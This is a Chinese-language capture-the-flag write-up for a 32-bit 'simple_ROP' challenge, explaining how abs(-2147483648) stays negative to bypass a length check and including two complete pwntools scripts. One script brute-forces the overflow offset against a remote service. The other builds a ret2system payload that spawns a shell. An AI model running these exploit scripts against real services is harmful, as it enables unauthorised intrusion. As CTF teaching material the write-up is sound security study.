## simple_ROP

- 漏洞类型：栈溢出、整数溢出

  ```c
  int __cdecl sub_8048738(char *buf, int ptr)
  {
    size_t size; // eax
    char v4[16]; // [esp+8h] [ebp-20h]
    int v5; // [esp+18h] [ebp-10h]
    int v6; // [esp+1Ch] [ebp-Ch]
  
    v5 = abs(ptr);
    if ( v5 < 0 )
    {
      v6 %= 32;
    }
    else
    {
      v6 = rand() % 16;
      buf[16 - v6] = 0;
    }
    size = strlen(buf);
    memcpy(&v4[v6], buf, size);
    return puts("copy over!");
  }
  ```

- 其中`buf`中是之前`read`读的`48`字节数据，`ptr`是`scanf("%ud")`读的数

  这里想要栈溢出，必须让`abs(ptr)<0`，否则`buf`会被随机截断

  然鹅，取绝对值后的数肿么可能是负数呢？？？百度了一下，发现`abs`存在漏洞

- `abs`函数的返回值是有符号整数`int`，表示范围是`-2147483648~2147483647`

  当`ptr=-2147483648`时，对应的绝对值是`2147483648`，超过了`int`的最大表示范围，产生溢出

  溢出的结果是`-2147483648`，所以此时`abs`函数的返回值是个负数

  此外，这题给的`ptr`是无符号整数，因此直接让`ptr=2147483648`，也可以实现有符号整数溢出

- 绕过了`abs`，之后还有一个坑，`memcpy`的目的地址会加上`v6`，`v6`的值并不确定

  我在本地攻击时`v6=2`，而远程攻击却失败了，原因就是本地和远程环境`v6`的值不一样

  解决办法是写个脚本，爆破一下`offset`（`v6`取值范围为`0~32`，对应`offset`取值范围`4~36`）

  ```
  [+] copy over!
      You need search Rop
  [+] right! offset=36
  [*] Closed connection to 47.106.94.13 port 50012
  ```

  脚本如下：

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './simple_rop'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = local_libc # '../libc.so.6'
  
  is_local = False
  is_remote = False
  
  elf = ELF(local_file)
  
  # context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  system = elf.symbols['system']
  binsh = 0x804a050
  main = 0x804864B
  
  flag = 0
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  def exp(p,offset):        
      global flag
      # offset = 34
      payload = 'A'*offset
      # payload += p32(system) + p32(main) + p32(binsh)
      payload += p32(main)
  
      ru('Rop\n')
      sl(payload)
      sleep(1)
      ru('cursor: \n')
      # debug('b *0x8048785')
      sl('-2147483648')
  
      sleep(0.5)
  
      data = rc(1000)
      log.success(data)
      if 'You need search Rop' in data:
          log.success("right! offset="+str(offset))
          flag = 1
      else:
          log.warning("fail!  offset="+str(offset))
  
  #  v6  off
  #  0   36
  #  2   34
  #  32  4
  offset = 36
  while flag==0:
      if len(sys.argv) == 1:
          is_local = True
          p = process(local_file)
          libc = ELF(local_libc)
      elif len(sys.argv) > 1:
          is_remote = True
          if len(sys.argv) == 3:
              host = sys.argv[1]
              port = sys.argv[2]
          else:
              host, port = sys.argv[1].split(':')
          p = remote(host, port)
          libc = ELF(remote_libc)
      exp(p,offset)
      offset -= 1
      if offset <= 0:
          break
  ```

- 拿到远程的`offset`之后才是真正的`SIMPLE ROP`攻击

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './simple_rop'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = local_libc # '../libc.so.6'
  
  is_local = False
  is_remote = False
  
  if len(sys.argv) == 1:
      is_local = True
      p = process(local_file)
      libc = ELF(local_libc)
  elif len(sys.argv) > 1:
      is_remote = True
      if len(sys.argv) == 3:
          host = sys.argv[1]
          port = sys.argv[2]
      else:
          host, port = sys.argv[1].split(':')
      p = remote(host, port)
      libc = ELF(remote_libc)
  
  elf = ELF(local_file)
  
  context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  # info
  # gadget
  # elf, libc
  system = elf.symbols['system']
  binsh = elf.search('/bin/sh').next()
  
  # rop1
  offset = 36
  payload = 'A'*offset
  payload += p32(system) + p32(0xdeadbeef) + p32(binsh)
  
  sl(payload)
  
  sleep(1)
  
  sl('-2147483648')
  
  # debug()
  # info_addr('tag',addr)
  # log.warning('--------------')
  
  p.interactive()
  ```

  p.s.其实`docker`默认的操作系统是`Ubuntu16.04`，但是不可能为了做个题就装个虚拟机吧hhhh